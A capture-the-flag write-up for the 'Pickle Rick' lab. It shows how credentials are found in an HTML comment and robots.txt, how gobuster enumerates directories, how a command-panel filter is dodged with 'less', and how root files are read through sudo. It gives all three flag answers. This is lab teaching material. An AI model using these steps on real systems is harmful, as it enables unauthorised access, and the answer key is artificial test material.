# Pickle Rick

1. What is the first ingredient that Rick needs?
2. What is the second ingredient in Rickâ€™s potion?
3. What is the last and final ingredient?

Inspecting the HTML of the landing page (`index.html`), we come across a comment:

```text
Note to self, remember username!

    Username: R1ckRul3s
```

Username... but there's no direct way to access a login page

Let's try directory enumeration:

```shell
gobuster dir -u 10.10.241.41 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

```text
robots.txt
> Wubbalubbadubdub

clue.txt
> Look around the file system for the other ingredient.
```

The `assets/` just contains a few images

`portal.php` and `login.php` both direct to the same login page; Username: *R1ckRul3s* and Password: *Wubbalubbadubdub* worked!

Upon logging in, we get a command panel, a Shell!

```shell
ls
```

```shell
cat Sup3rS3cretPickl3Ingred.txt
> Command denied
less Sup3rS3cretPickl3Ingred.txt
> mr. meeseek hair
```

Answer-1: **mr. meeseek hair**

Now, let's try to search for all the text files in the system:

```shell
find / -type f -name "*.txt"
> lot of files, but nothing interesting
sudo find / -type f -name "*.txt"
> an interesting file: /root/3rd.txt
sudo less /root/3rd.txt
> 3rd ingredients: fleeb juice
```

Answer-3: **fleeb juice**

Maybe we can try searching files with "ingredient" in name:

```shell
find / -iname "ingredient"
> /home/rick/second ingredients
less "/home/rick/second ingredients"
> 1 jerry tear
```

Answer-2: **1 jerry tear**
